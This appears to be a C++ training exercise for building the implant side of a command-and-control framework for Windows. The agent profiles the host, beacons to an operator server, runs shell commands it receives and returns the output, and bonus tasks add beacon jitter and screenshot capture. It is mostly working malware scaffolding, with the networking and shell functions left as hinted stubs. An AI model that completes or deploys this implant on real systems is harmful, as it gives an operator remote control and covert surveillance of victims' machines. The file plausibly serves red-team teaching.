/*
  Exercise 02 — C2 Agent: Beacon Loop (C++)
  ------------------------------------------
  Build the implant side of the C2 framework from ex01.
  The agent runs on the target machine and:
    1. Collects host info (hostname, username, OS version).
    2. POSTs to /beacon every N seconds, receiving a task.
    3. Executes the task.
    4. POSTs the output back to /result.

  HTTP transport: use WinINet (no external deps) — HttpOpenRequest + HttpSendRequest.

  Task types to handle:
    shell      → run via CreateProcess with pipe capture, return stdout/stderr
    screenshot → capture screen to BMP bytes, base64 encode, return as string
    exit       → call ExitProcess(0)

  Tasks:
  1. Implement collectHostInfo() — fills a JSON string with:
       { "agentId":"...", "hostname":"...", "username":"...", "os":"..." }
     Use GetComputerNameA, GetUserNameA, RtlGetVersion or "VerifyVersionInfo".
  2. Implement httpPost(url, body) → returns response body string.
     Use WinINet: InternetOpen → InternetConnect → HttpOpenRequest →
     HttpSendRequest → InternetReadFile.
  3. Implement runShell(cmd) → returns stdout+stderr string.
     Use CreateProcess with STARTF_USESTDHANDLES + anonymous pipe.
  4. Implement beaconLoop() — POST /beacon, parse task JSON, dispatch,
     POST /result, sleep.

  BONUS:
  - Parse the sleep interval from the server response ("sleep": 5000) so
    the operator can adjust beacon frequency.
  - Add jitter: sleep = base + rand() % jitter.
  - Implement screenshot: use BitBlt → GetDIBits → base64 encode.

  Compile:
    cl /std:c++17 ex02_agent_beacon.cpp /link wininet.lib ws2_32.lib /OUT:agent.exe

  Test: run ex01_c2_server_routes.js first, then run agent.exe
*/

#pragma comment(lib, "wininet.lib")
#include <windows.h>
#include <wininet.h>
#include <string>
#include <vector>
#include <cstdio>

static const char* C2_HOST    = "127.0.0.1";
static const int   C2_PORT    = 4444;
static const int   SLEEP_MS   = 5000;

// Simple JSON field extractor (no external JSON lib)
std::string jsonGet(const std::string& json, const std::string& key) {
    std::string search = "\"" + key + "\":";
    size_t pos = json.find(search);
    if (pos == std::string::npos) return "";
    pos += search.size();
    while (pos < json.size() && (json[pos] == ' ' || json[pos] == '\t')) pos++;
    if (pos >= json.size()) return "";
    if (json[pos] == '"') {
        pos++;
        size_t end = json.find('"', pos);
        return end == std::string::npos ? "" : json.substr(pos, end - pos);
    }
    size_t end = json.find_first_of(",}", pos);
    return end == std::string::npos ? json.substr(pos) : json.substr(pos, end - pos);
}

// ---------- TODO 1: collectHostInfo ----------
std::string collectHostInfo() {
    char hostname[256] = "unknown", username[256] = "unknown";
    DWORD sz = sizeof(hostname);
    GetComputerNameA(hostname, &sz);
    sz = sizeof(username);
    GetUserNameA(username, &sz);

    // Generate a stable agent ID from hostname hash
    DWORD id = 0;
    for (int i = 0; hostname[i]; i++) id = id * 31 + hostname[i];
    char agentId[32]; sprintf_s(agentId, "agent-%08X", id);

    // YOUR CODE HERE: build the JSON string
    // Return: { "agentId":"...", "hostname":"...", "username":"...", "os":"win" }
    char buf[512];
    sprintf_s(buf,
        "{\"agentId\":\"%s\",\"hostname\":\"%s\","
        "\"username\":\"%s\",\"os\":\"win\"}",
        agentId, hostname, username);
    return buf;
}

// ---------- TODO 2: httpPost ----------
std::string httpPost(const std::string& path, const std::string& body) {
    std::string response;

    // YOUR CODE HERE:
    // HINTERNET hInet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, ...);
    // HINTERNET hConn = InternetConnectA(hInet, C2_HOST, C2_PORT, ...);
    // HINTERNET hReq  = HttpOpenRequestA(hConn, "POST", path.c_str(), ...);
    // const char* ct  = "Content-Type: application/json\r\n";
    // HttpSendRequestA(hReq, ct, ..., body.c_str(), body.size());
    // Then InternetReadFile loop to collect response
    // InternetCloseHandle ...

    (void)path; (void)body;
    return response;
}

// ---------- TODO 3: runShell ----------
std::string runShell(const std::string& cmd) {
    // YOUR CODE HERE:
    // Create anonymous pipes for stdout/stderr
    // CreateProcess with STARTF_USESTDHANDLES, piped stdout+stderr
    // Read until pipe closes
    // Return combined output

    (void)cmd;
    return "[shell not implemented]";
}

// ---------- TODO 4: beaconLoop ----------
void beaconLoop() {
    std::string hostInfo = collectHostInfo();
    std::string agentId  = jsonGet(hostInfo, "agentId");

    printf("[*] Agent ID: %s\n", agentId.c_str());
    printf("[*] Beaconing to %s:%d\n", C2_HOST, C2_PORT);

    while (true) {
        // 1. POST /beacon with hostInfo
        std::string resp = httpPost("/beacon", hostInfo);

        if (!resp.empty()) {
            std::string taskId   = jsonGet(resp, "taskId");
            std::string taskType = jsonGet(resp, "taskType");
            std::string taskData = jsonGet(resp, "taskData");

            if (!taskId.empty()) {
                printf("[*] Task %s: %s  data=%s\n",
                       taskId.c_str(), taskType.c_str(), taskData.c_str());

                std::string output;
                if (taskType == "shell")  output = runShell(taskData);
                else if (taskType == "exit") ExitProcess(0);
                else output = "[unknown task type]";

                // 2. POST /result
                char resultJson[4096];
                snprintf(resultJson, sizeof(resultJson),
                    "{\"agentId\":\"%s\",\"taskId\":\"%s\",\"output\":\"%s\"}",
                    agentId.c_str(), taskId.c_str(), output.c_str());
                httpPost("/result", resultJson);
            }
        }

        Sleep(SLEEP_MS);
    }
}

int main() {
    beaconLoop();
    return 0;
}
